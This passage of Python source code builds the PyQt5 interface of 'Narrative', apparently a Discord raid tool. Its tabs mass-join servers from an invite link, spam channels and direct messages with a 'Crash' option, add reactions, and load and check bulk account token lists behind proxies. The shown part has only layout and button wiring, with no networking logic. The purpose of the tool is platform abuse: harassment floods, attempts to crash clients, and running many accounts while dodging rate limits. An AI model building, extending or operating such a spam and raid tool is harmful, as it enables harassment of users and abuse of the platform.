        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(39, 39, 39))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Light, brush)
        brush = QtGui.QBrush(QtGui.QColor(32, 32, 32))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Midlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(13, 13, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Dark, brush)
        brush = QtGui.QBrush(QtGui.QColor(17, 17, 17))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Mid, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.BrightText, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Shadow, brush)
        brush = QtGui.QBrush(QtGui.QColor(76, 86, 106))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.Highlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(13, 13, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.AlternateBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.NoRole, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 220))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.ToolTipBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.ToolTipText, brush)
        brush = QtGui.QBrush(QtGui.QColor(13, 13, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Button, brush)
        brush = QtGui.QBrush(QtGui.QColor(39, 39, 39))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Light, brush)
        brush = QtGui.QBrush(QtGui.QColor(32, 32, 32))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Midlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(13, 13, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Dark, brush)
        brush = QtGui.QBrush(QtGui.QColor(17, 17, 17))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Mid, brush)
        brush = QtGui.QBrush(QtGui.QColor(13, 13, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Text, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 255))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.BrightText, brush)
        brush = QtGui.QBrush(QtGui.QColor(13, 13, 13))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.ButtonText, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Base, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Window, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Shadow, brush)
        brush = QtGui.QBrush(QtGui.QColor(76, 86, 106))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.Highlight, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.AlternateBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(26, 26, 26))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.NoRole, brush)
        brush = QtGui.QBrush(QtGui.QColor(255, 255, 220))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.ToolTipBase, brush)
        brush = QtGui.QBrush(QtGui.QColor(0, 0, 0))
        brush.setStyle(QtCore.Qt.SolidPattern)
        palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.ToolTipText, brush)
        NarrativeMainFrame.setPalette(palette)
        NarrativeMainFrame.setObjectName("NarrativeMainFrame")
        NarrativeMainFrame.resize(490, 321)
        font = QtGui.QFont()
        font.setFamily("Source Code Pro")
        NarrativeMainFrame.setFont(font)
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("NT.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
        NarrativeMainFrame.setWindowIcon(icon)
        self.centralwidget = QtWidgets.QWidget(NarrativeMainFrame)
        self.centralwidget.setObjectName("centralwidget")
        #self.centralwidget.setStyleSheet("background-color:black;")


        self.tabWidget = QtWidgets.QTabWidget(self.centralwidget)
        self.tabWidget.setGeometry(QtCore.QRect(0, 0, 491, 751))
        self.tabWidget.setPalette(palette)
        self.tabWidget.setStyleSheet("""
        QWidget {
            background-color: rgb(26, 26, 26);
            }
        """)
        self.tabWidget.setObjectName("tabWidget")
        

 
        self.JoinFrame = QtWidgets.QWidget()
        self.JoinFrame.setObjectName("JoinFrame")
        self.JoinButton = QtWidgets.QPushButton(self.JoinFrame)
        self.JoinButton.setGeometry(QtCore.QRect(10, 130, 241, 23))
        self.JoinButton.setObjectName("JoinButton")

        #Join Button Initiates Join Server Because its a bullshit manager
        self.JoinButton.clicked.connect(lambda: self.JoinServerStart())




      

        self.JoinDelaySlider = QtWidgets.QSlider(self.JoinFrame)
        self.JoinDelaySlider.setGeometry(QtCore.QRect(10, 80, 160, 22))
        self.JoinDelaySlider.setOrientation(QtCore.Qt.Horizontal)
        self.JoinDelaySlider.setObjectName("JoinDelaySlider")
        self.Label4invite = QtWidgets.QLabel(self.JoinFrame)
        self.Label4invite.setGeometry(QtCore.QRect(10, 20, 211, 16))
        self.Label4invite.setObjectName("Label4invite")
        self.JoinFrameInput = QtWidgets.QLineEdit(self.JoinFrame)
        self.JoinFrameInput.setGeometry(QtCore.QRect(10, 40, 291, 20))
        self.JoinFrameInput.setObjectName("JoinFrameInput")
        self.JoinDelayLabel = QtWidgets.QLabel(self.JoinFrame)
        self.JoinDelayLabel.setGeometry(QtCore.QRect(10, 60, 81, 16))
        self.JoinDelayLabel.setObjectName("JoinDelayLabel")
        self.JoinDelaySlider.valueChanged[int].connect(self.JoinSliderChangeValue)


        self.tabWidget.addTab(self.JoinFrame, "")
        




        self.LeaveFrame = QtWidgets.QWidget()
        self.LeaveFrame.setObjectName("LeaveFrame")
        #self.LeaveFrame.setStyleSheet("""
        #QWidget {
            #background-color: rgb(26, 26, 26);
            #}
        #""")
        self.Label4GuildID = QtWidgets.QLabel(self.LeaveFrame)
        self.Label4GuildID.setGeometry(QtCore.QRect(10, 20, 131, 16))
        self.Label4GuildID.setObjectName("Label4GuildID")
        self.LeaveButton = QtWidgets.QPushButton(self.LeaveFrame)
        self.LeaveButton.setGeometry(QtCore.QRect(10, 100, 241, 23))
        self.LeaveButton.setObjectName("LeaveButton")
        self.LeaveButton.clicked.connect(lambda: self.LeaveServerStart())
        
        
        self.LeaveFrameInput = QtWidgets.QLineEdit(self.LeaveFrame)
        self.LeaveFrameInput.setGeometry(QtCore.QRect(10, 40, 291, 20))
        self.LeaveFrameInput.setObjectName("LeaveFrameInput")   

        self.LeaveRequestsCheckBox = QtWidgets.QCheckBox(self.LeaveFrame)
        self.LeaveRequestsCheckBox.setGeometry(QtCore.QRect(10, 60, 101, 17))
        self.LeaveRequestsCheckBox.setObjectName("LeaveRequestsCheckBox")

        self.tabWidget.addTab(self.LeaveFrame, "")
        
        
        
        
        
        
        self.SpamFrame = QtWidgets.QWidget()
        self.SpamFrame.setObjectName("SpamFrame")
        self.label = QtWidgets.QLabel(self.SpamFrame)
        self.label.setGeometry(QtCore.QRect(10, 0, 91, 16))
        self.label.setObjectName("label")
        self.SpamFrameChannelInput = QtWidgets.QLineEdit(self.SpamFrame)
        self.SpamFrameChannelInput.setGeometry(QtCore.QRect(10, 20, 291, 20))
        self.SpamFrameChannelInput.setObjectName("SpamFrameChannelInput")
        self.SpamFrameRequestCheckBox = QtWidgets.QCheckBox(self.SpamFrame)
        self.SpamFrameRequestCheckBox.setGeometry(QtCore.QRect(290, 80, 121, 17))
        self.SpamFrameRequestCheckBox.setObjectName("SpamFrameRequestCheckBox")




        self.SpamFrameStartButton = QtWidgets.QPushButton(self.SpamFrame)
        self.SpamFrameStartButton.setGeometry(QtCore.QRect(10, 210, 151, 23))
        self.SpamFrameStartButton.setObjectName("SpamFrameStartButton")
        self.SpamFrameStartButton.clicked.connect(lambda: self.StartSpamServer())



        self.SpamFrameStopButton = QtWidgets.QPushButton(self.SpamFrame)
        self.SpamFrameStopButton.setGeometry(QtCore.QRect(160, 210, 151, 23))
        self.SpamFrameStopButton.setObjectName("SpamFrameStopButton")
        self.SpamFrameStopButton.clicked.connect(lambda: self.StopSpamServer())



        self.label_3 = QtWidgets.QLabel(self.SpamFrame)
        self.label_3.setGeometry(QtCore.QRect(10, 40, 47, 13))
        self.label_3.setObjectName("label_3")
        self.SpamFrameSpamTextBox = QtWidgets.QTextEdit(self.SpamFrame)
        self.SpamFrameSpamTextBox.setGeometry(QtCore.QRect(10, 60, 271, 91))
        self.SpamFrameSpamTextBox.setObjectName("SpamFrameSpamTextBox")
        self.DelayLabel_3 = QtWidgets.QLabel(self.SpamFrame)
        self.DelayLabel_3.setGeometry(QtCore.QRect(10, 160, 81, 16))
        self.DelayLabel_3.setObjectName("DelayLabel_3")
        self.SpamDelaySlider = QtWidgets.QSlider(self.SpamFrame)
        self.SpamDelaySlider.setGeometry(QtCore.QRect(10, 180, 160, 22))
        self.SpamDelaySlider.setOrientation(QtCore.Qt.Horizontal)
        self.SpamDelaySlider.setObjectName("SpamDelaySlider")

        self.SpamDelaySlider.valueChanged[int].connect(self.SpamDelaySliderChangeValue)

        self.SpamFrameCrashCheckBox = QtWidgets.QCheckBox(self.SpamFrame)
        self.SpamFrameCrashCheckBox.setGeometry(QtCore.QRect(290, 100, 91, 17))
        self.SpamFrameCrashCheckBox.setObjectName("SpamFrameCrashCheckBox")
        self.tabWidget.addTab(self.SpamFrame, "")
        
        
        
        
        
        
        
        
        self.DMFrame = QtWidgets.QWidget()
        self.DMFrame.setObjectName("DMFrame")
        self.DelayLabel_4 = QtWidgets.QLabel(self.DMFrame)
        self.DelayLabel_4.setGeometry(QtCore.QRect(10, 160, 111, 16))
        self.DelayLabel_4.setObjectName("DelayLabel_4")
        self.DMFrameStopButton = QtWidgets.QPushButton(self.DMFrame)
        self.DMFrameStopButton.setGeometry(QtCore.QRect(160, 210, 151, 23))
        self.DMFrameStopButton.setObjectName("DMFrameStopButton")
        self.DMFrameStopButton.clicked.connect(lambda: self.DmSpamStop())
        self.DMFrameCrashCheckBox = QtWidgets.QCheckBox(self.DMFrame)
        self.DMFrameCrashCheckBox.setGeometry(QtCore.QRect(290, 80, 91, 17))
        self.DMFrameCrashCheckBox.setObjectName("DMFrameCrashCheckBox")
        self.DMFrameUserInput = QtWidgets.QLineEdit(self.DMFrame)
        self.DMFrameUserInput.setGeometry(QtCore.QRect(10, 20, 291, 20))
        self.DMFrameUserInput.setObjectName("DMFrameUserInput")
        self.DMDelaySlider = QtWidgets.QSlider(self.DMFrame)
        self.DMDelaySlider.setGeometry(QtCore.QRect(10, 180, 160, 22))
        self.DMDelaySlider.setOrientation(QtCore.Qt.Horizontal)
        self.DMDelaySlider.setObjectName("DMDelaySlider")
        self.DMDelaySlider.valueChanged[int].connect(self.DMDelaySliderChangeValue)



        self.DMFrameStartButton = QtWidgets.QPushButton(self.DMFrame)
        self.DMFrameStartButton.setGeometry(QtCore.QRect(10, 210, 151, 23))
        self.DMFrameStartButton.setObjectName("DMFrameStartButton")
        self.DMFrameStartButton.clicked.connect(lambda: self.DmSpamStart())


        self.DMFrameSpamTextBox = QtWidgets.QTextEdit(self.DMFrame)
        self.DMFrameSpamTextBox.setGeometry(QtCore.QRect(10, 60, 271, 91))
        self.DMFrameSpamTextBox.setObjectName("DMFrameSpamTextBox")
        self.label_5 = QtWidgets.QLabel(self.DMFrame)
        self.label_5.setGeometry(QtCore.QRect(10, 0, 61, 16))
        self.label_5.setObjectName("label_5")
        self.label_6 = QtWidgets.QLabel(self.DMFrame)
        self.label_6.setGeometry(QtCore.QRect(10, 40, 47, 13))
        self.label_6.setObjectName("label_6")
        self.tabWidget.addTab(self.DMFrame, "")
        
        
        
        
        
        
        
        self.ReactFrame = QtWidgets.QWidget()
        self.ReactFrame.setObjectName("ReactFrame")
        self.label_7 = QtWidgets.QLabel(self.ReactFrame)
        self.label_7.setGeometry(QtCore.QRect(10, 10, 111, 16))
        self.label_7.setObjectName("label_7")
        self.ReactFrameUrlTextBox = QtWidgets.QLineEdit(self.ReactFrame)
        self.ReactFrameUrlTextBox.setGeometry(QtCore.QRect(10, 30, 291, 20))
        self.ReactFrameUrlTextBox.setObjectName("ReactFrameUrlTextBox")
        self.ReactStartButton = QtWidgets.QPushButton(self.ReactFrame)
        self.ReactStartButton.setGeometry(QtCore.QRect(10, 70, 241, 23))
        self.ReactStartButton.setObjectName("ReactStartButton")
        self.ReactStartButton.clicked.connect(lambda: self.ReactMessageStart())

        self.tabWidget.addTab(self.ReactFrame, "")
        
        
        
        
        self.TokenFrame = QtWidgets.QWidget()
        self.TokenFrame.setObjectName("TokenFrame")
        self.TokenFrameCheckCheckBox = QtWidgets.QCheckBox(self.TokenFrame)
        self.TokenFrameCheckCheckBox.setGeometry(QtCore.QRect(10, 70, 431, 17))
        self.TokenFrameCheckCheckBox.setObjectName("TokenFrameCheckCheckBox")
        self.TokenFrameDirectory = QtWidgets.QLineEdit(self.TokenFrame)
        self.TokenFrameDirectory.setGeometry(QtCore.QRect(10, 40, 291, 20))
        self.TokenFrameDirectory.setObjectName("TokenFrameDirectory")
        self.label_4 = QtWidgets.QLabel(self.TokenFrame)
        self.label_4.setGeometry(QtCore.QRect(10, 20, 111, 16))
        self.label_4.setObjectName("label_4")
        self.TokenFrameImportButton = QtWidgets.QPushButton(self.TokenFrame)
        self.TokenFrameImportButton.setGeometry(QtCore.QRect(310, 40, 61, 21))
        self.TokenFrameImportButton.setObjectName("TokenFrameImportButton")
        self.TokenFrameCountLabel = QtWidgets.QLabel(self.TokenFrame)
        self.TokenFrameCountLabel.setGeometry(QtCore.QRect(10, 120, 281, 16))
        self.TokenFrameCountLabel.setObjectName("TokenFrameCountLabel")
        self.TokenFrameLoadButton = QtWidgets.QPushButton(self.TokenFrame)
        self.TokenFrameLoadButton.setGeometry(QtCore.QRect(10, 140, 81, 23))
        self.TokenFrameLoadButton.setObjectName("TokenFrameLoadButton")
        self.tabWidget.addTab(self.TokenFrame, "")




        self.TokenFrameImportButton.clicked.connect(lambda: self.tokenfileopen())
        self.TokenFrameLoadButton.clicked.connect(lambda: self.get_tokens(self.TokenFrameDirectory.text()))        
        
        
        self.ProxyFrame = QtWidgets.QWidget()
        self.ProxyFrame.setObjectName("ProxyFrame")
        self.ProxyFrameLoadButton = QtWidgets.QPushButton(self.ProxyFrame)
        self.ProxyFrameLoadButton.setGeometry(QtCore.QRect(10, 100, 111, 23))
        self.ProxyFrameLoadButton.setObjectName("ProxyFrameLoadButton")
        
        
        self.label_9 = QtWidgets.QLabel(self.ProxyFrame)
        self.label_9.setGeometry(QtCore.QRect(10, 10, 151, 16))
        self.label_9.setObjectName("label_9")
        self.ProxyFrameDirectory = QtWidgets.QLineEdit(self.ProxyFrame)
        self.ProxyFrameDirectory.setGeometry(QtCore.QRect(10, 30, 291, 20))
        self.ProxyFrameDirectory.setObjectName("ProxyFrameDirectory")
        self.ProxyFrameImportButton = QtWidgets.QPushButton(self.ProxyFrame)
        self.ProxyFrameImportButton.setGeometry(QtCore.QRect(310, 30, 61, 21))
        self.ProxyFrameImportButton.setObjectName("ProxyFrameImportButton")
        
        
        
        
        self.ProxyFrameImportButton.clicked.connect(lambda: self.fileopen())


        self.ProxyFrameLoadButton.clicked.connect(lambda: self.get_proxylist(self.ProxyFrameDirectory.text()))
        

        self.ProxyCountLabel = QtWidgets.QLabel(self.ProxyFrame)
        self.ProxyCountLabel.setGeometry(QtCore.QRect(10, 70, 291, 16))
        self.ProxyCountLabel.setObjectName("ProxyCountLabel")
        
        
        
        
        self.tabWidget.addTab(self.ProxyFrame, "")
        self.SettingsFrame = QtWidgets.QWidget()
        self.SettingsFrame.setObjectName("SettingsFrame")
        self.PythonInterpInputBox = QtWidgets.QLineEdit(self.SettingsFrame)
        self.PythonInterpInputBox.setGeometry(QtCore.QRect(10, 30, 211, 20))
        self.PythonInterpInputBox.setObjectName("PythonInterpInputBox")
        


        #self.settings = QSettings('NarrativeDarkMode', 'Narrative')
        
        self.label_2 = QtWidgets.QLabel(self.SettingsFrame)
        self.label_2.setGeometry(QtCore.QRect(10, 10, 141, 16))
        self.label_2.setObjectName("label_2")
        self.tabWidget.addTab(self.SettingsFrame, "")



        NarrativeMainFrame.setCentralWidget(self.centralwidget)
        self.statusbar = QtWidgets.QStatusBar(NarrativeMainFrame)
        self.statusbar.setObjectName("statusbar")
        NarrativeMainFrame.setStatusBar(self.statusbar)

        self.retranslateUi(NarrativeMainFrame)
        self.tabWidget.setCurrentIndex(7)
        QtCore.QMetaObject.connectSlotsByName(NarrativeMainFrame)

    



    def SetConsoleText(self, text):
        self.output_rd.append(text)    


    def ConsoleretranslateUi(self, Console):
        _translate = QtCore.QCoreApplication.translate
        Console.setWindowTitle(_translate("Console", "Logs"))
    
    
    
    def retranslateUi(self, NarrativeMainFrame):
        _translate = QtCore.QCoreApplication.translate
        NarrativeMainFrame.setWindowTitle(_translate("NarrativeMainFrame", "Narrative"))
        self.JoinButton.setText(_translate("NarrativeMainFrame", "Join"))
        self.Label4invite.setText(_translate("NarrativeMainFrame", "Discord Link Invite:"))
        self.JoinDelayLabel.setText(_translate("NarrativeMainFrame", "Delay: 100ms"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.JoinFrame), _translate("NarrativeMainFrame", "Guild Joiner"))
        self.Label4GuildID.setText(_translate("NarrativeMainFrame", "Guild ID:"))
        self.LeaveButton.setText(_translate("NarrativeMainFrame", "Leave"))
        self.LeaveRequestsCheckBox.setText(_translate("NarrativeMainFrame", "Use Requests"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.LeaveFrame), _translate("NarrativeMainFrame", "Guild Leaver"))
        self.label.setText(_translate("NarrativeMainFrame", "Channel ID:"))
        self.SpamFrameRequestCheckBox.setText(_translate("NarrativeMainFrame", "Use Requests"))
        self.SpamFrameStartButton.setText(_translate("NarrativeMainFrame", "Start"))
        self.SpamFrameStopButton.setText(_translate("NarrativeMainFrame", "Stop"))
        self.label_3.setText(_translate("NarrativeMainFrame", "Text:"))
        self.DelayLabel_3.setText(_translate("NarrativeMainFrame", "Delay: 100ms"))
        self.SpamFrameCrashCheckBox.setText(_translate("NarrativeMainFrame", "Crash"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.SpamFrame), _translate("NarrativeMainFrame", "Spam"))
        self.DelayLabel_4.setText(_translate("NarrativeMainFrame", "Delay: 100ms"))
        self.DMFrameStopButton.setText(_translate("NarrativeMainFrame", "Stop"))
        self.DMFrameCrashCheckBox.setText(_translate("NarrativeMainFrame", "Crash"))
        self.DMFrameStartButton.setText(_translate("NarrativeMainFrame", "Start"))
        self.label_5.setText(_translate("NarrativeMainFrame", "User ID:"))
        self.label_6.setText(_translate("NarrativeMainFrame", "Text:"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.DMFrame), _translate("NarrativeMainFrame", "DM"))
        self.label_7.setText(_translate("NarrativeMainFrame", "Reaction Api V6 URL:"))
        self.ReactStartButton.setText(_translate("NarrativeMainFrame", "React"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.ReactFrame), _translate("NarrativeMainFrame", "React"))
        self.TokenFrameCheckCheckBox.setText(_translate("NarrativeMainFrame", "Check Tokens before using and export to another token list"))
        self.label_4.setText(_translate("NarrativeMainFrame", "Tokens directory:"))
        self.TokenFrameImportButton.setText(_translate("NarrativeMainFrame", "Import"))
        self.TokenFrameCountLabel.setText(_translate("NarrativeMainFrame", "Current Amount of Tokens Loaded:"))
        self.TokenFrameLoadButton.setText(_translate("NarrativeMainFrame", "Load Tokens"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.TokenFrame), _translate("NarrativeMainFrame", "Tokens"))
        self.ProxyFrameLoadButton.setText(_translate("NarrativeMainFrame", "Load Proxies"))
        self.label_9.setText(_translate("NarrativeMainFrame", "Proxies directory:"))
        self.ProxyFrameImportButton.setText(_translate("NarrativeMainFrame", "Import"))
        self.ProxyCountLabel.setText(_translate("NarrativeMainFrame", "Total Proxy Count: "))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.ProxyFrame), _translate("NarrativeMainFrame", "Proxies"))
        self.label_2.setText(_translate("NarrativeMainFrame", "Your Python Syntax:"))
        self.tabWidget.setTabText(self.tabWidget.indexOf(self.SettingsFrame), _translate("NarrativeMainFrame", "Settings"))


# class MyWindow(QtWidgets.QMainWindow):
#     def closeEvent(self,event):
#         self.settings.setValue('pythoninput', self.PythonInterpInputBox.Text())
#         print('Saved')



if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    NarrativeMainFrame = NarrativeMainFrame()
    NarrativeMainFrame.show()
    NarrativeMainFrame.Console.show()
    sys.exit(app.exec_())
